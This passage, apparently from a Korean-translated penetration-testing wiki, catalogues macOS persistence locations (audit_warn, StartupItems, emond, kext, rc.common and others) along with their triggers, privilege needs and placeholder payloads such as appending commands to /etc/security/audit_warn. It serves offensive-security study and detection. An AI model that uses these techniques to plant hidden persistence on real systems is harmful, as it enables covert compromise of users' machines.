printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- sandbox 우회에 유용함: [🟠](https://emojipedia.org/large-orange-circle)
- 그러나 root여야 하고, auditd가 실행 중이며 경고를 발생시켜야 함
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/etc/security/audit_warn`**
- root 권한 필요
- **트리거**: auditd가 경고를 감지할 때

#### Description & Exploit

auditd가 경고를 감지하면 스크립트 **`/etc/security/audit_warn`**가 **실행됩니다**. 따라서 해당 파일에 payload를 추가할 수 있습니다.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
`sudo audit -n`로 경고를 강제할 수 있습니다.

### 시작 항목

> [!CAUTION] > **이것은 더 이상 사용되지 않으므로 해당 디렉터리에서는 아무 것도 찾아서는 안 됩니다.**

The **StartupItem** is a directory that should be positioned within either `/Library/StartupItems/` or `/System/Library/StartupItems/`. Once this directory is established, it must encompass two specific files:

1. An **rc script**: 시스템 시작 시 실행되는 쉘 스크립트.
2. A **plist file**: `StartupParameters.plist`라는 이름의 파일로, 다양한 구성 설정을 포함합니다.

시작 프로세스가 이를 인식하고 사용하려면 rc script와 `StartupParameters.plist` 파일이 모두 **StartupItem** 디렉터리 내부에 올바르게 배치되어야 합니다.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> 내 macOS에서 이 구성요소를 찾을 수 없습니다. 자세한 내용은 writeup을 확인하세요

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Introduced by Apple, **emond** is a logging mechanism that seems to be underdeveloped or possibly abandoned, yet it remains accessible. Apple이 도입한 **emond**는 미완성되었거나 사실상 방치된 것으로 보이는 로깅 메커니즘이지만 여전히 접근 가능합니다. Mac 관리자에게는 크게 유용하지 않지만, 이 잘 알려지지 않은 서비스는 위협 행위자가 대부분의 macOS 관리자에게 눈치채지지 않은 채 은밀한 persistence 수단으로 사용할 수 있습니다.

이 존재를 아는 사람이라면 **emond**의 악성 사용 여부를 식별하는 것은 비교적 간단합니다. 이 서비스의 시스템 LaunchDaemon은 실행할 스크립트를 단일 디렉터리에서 찾습니다. 이를 검사하려면 다음 명령을 사용할 수 있습니다:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

참고: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### 위치

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- root 권한 필요
- **트리거**: With XQuartz

#### 설명 & Exploit

XQuartz는 **macOS에 더 이상 설치되어 있지 않습니다**, 자세한 내용은 위의 writeup을 확인하세요.

### ~~kext~~

> [!CAUTION]
> kext를 root로 설치하는 것조차 매우 복잡하므로, exploit이 없다면 이를 sandboxes를 탈출하거나 persistence를 위한 방법으로 고려하지 않습니다.

#### 위치

KEXT를 startup item으로 설치하려면, 다음 위치 중 하나에 **설치되어야 합니다**:

- `/System/Library/Extensions`
- OS X 운영체제에 내장된 KEXT 파일.
- `/Library/Extensions`
- 타사 소프트웨어에 의해 설치된 KEXT 파일

현재 로드된 kext 파일을 나열하려면 다음을 사용할 수 있습니다:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
For more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Location

- **`/usr/local/bin/amstoold`**
- 루트 권한 필요

#### Description & Exploitation

해당 `plist`(`/System/Library/LaunchAgents/com.apple.amstoold.plist`)는 이 바이너리를 사용하면서 XPC 서비스를 노출하고 있었는데... 문제는 그 바이너리가 존재하지 않았다는 점입니다. 따라서 그 위치에 바이너리를 배치하면 XPC 서비스가 호출될 때 해당 바이너리가 실행됩니다.

제 macOS에서는 더 이상 이 항목을 찾을 수 없습니다.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Location

- **`/Library/Preferences/Xsan/.xsanrc`**
- 루트 권한 필요
- **Trigger**: 서비스가 실행될 때 (드물게)

#### Description & exploit

이 스크립트를 실행하는 경우는 드물고, 제 macOS에서도 찾을 수 없었습니다. 더 자세한 정보는 writeup을 확인하세요.

### ~~/etc/rc.common~~

> [!CAUTION] > **이것은 최신 MacOS 버전에서는 작동하지 않습니다**

여기에 **시작 시 실행될 명령을** 넣는 것도 가능합니다. 일반적인 rc.common 스크립트 예:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence 기법 및 도구

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## 참고자료

- [2025년, Infostealer의 해](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
